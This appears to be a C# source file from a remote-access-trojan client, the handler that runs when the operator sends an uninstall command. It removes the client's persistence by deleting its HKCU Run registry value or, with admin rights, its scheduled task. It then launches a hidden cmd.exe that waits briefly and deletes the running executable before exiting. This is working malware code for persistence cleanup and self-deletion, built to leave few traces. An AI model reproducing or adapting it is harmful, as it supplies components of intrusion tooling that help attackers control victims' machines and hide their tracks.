using Client.Helper;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;

namespace Client.Handle_Packet
{
    public class HandleUninstall
    {
        public HandleUninstall()
        {
            if (Convert.ToBoolean(Settings.Install))
            {
                try
                {
                    if (!Methods.IsAdmin())
                        Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",RegistryKeyPermissionCheck.ReadWriteSubTree).DeleteValue(Settings.InstallFile);
                    else
                    {
                        Process.Start(new ProcessStartInfo()
                        {
                            FileName = "schtasks",
                            Arguments = $"/delete /f /tn \"" + Settings.InstallFile + "\"",
                            CreateNoWindow = true,
                            ErrorDialog = false,
                            UseShellExecute = false,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });
                    }
                }
                catch { }
            }
            ProcessStartInfo Del = null;
            try
            {
                Del = new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    Arguments = "choice /C Y /N /D Y /T 2 & Del \"" + Application.ExecutablePath + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                };
            }
            catch { }
            finally
            {
                Process.Start(Del);
                Methods.ClientExit();
                Environment.Exit(0);
            }
        }
    }
}
